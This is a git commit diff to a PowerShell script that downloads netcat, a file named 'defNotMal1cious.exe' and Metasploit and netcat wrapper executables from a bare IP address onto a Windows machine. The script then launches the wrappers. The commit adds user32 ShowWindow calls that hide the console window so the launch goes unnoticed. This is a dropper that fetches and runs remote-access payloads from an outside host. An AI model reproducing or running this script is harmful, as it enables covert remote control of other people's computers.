f2a5f2037c68db9150ede2a85bbdda70a0fa22ff
soupsamich <66322946+soupsamich@users.noreply.github.com>
2020-06-28 05:42:16 -0400

    Update windowsScript.ps1

--- windowsScript.ps1
+++ windowsScript.ps1
@@ -3,5 +3,11 @@ Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/nc.exe -OutFi
 Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/defNotMal1cious.exe -OutFile C:/defNotMal1cious.exe;
 Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrapperMSF.exe -OutFile C:/windowsWrapperMSF.exe;
 Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrapperNC.exe -OutFile C:/windowsWrapperNC.exe;
-Start-Process -FilePath C:\windowsWrapperNC.exe -NoNewWindow -RedirectStandardOutput C:\Users\HashCrackUser1\file -passthru
-Start-Process -FilePath C:\windowsWrapperMSF.exe -NoNewWindow -RedirectStandardOutput C:\Users\HashCrackUser1\file1 -passthru
+$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
+add-type -name win -member $t -namespace native
+[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
+{Start-Process -FilePath C:\windowsWrapperNC.exe -NoNewWindow -RedirectStandardOutput C:\Users\HashCrackUser1\file -passthru}
+$s = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
+add-type -name win -member $s -namespace native
+[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
+{Start-Process -FilePath C:\windowsWrapperMSF.exe -NoNewWindow -RedirectStandardOutput C:\Users\HashCrackUser1\file1 -passthru}
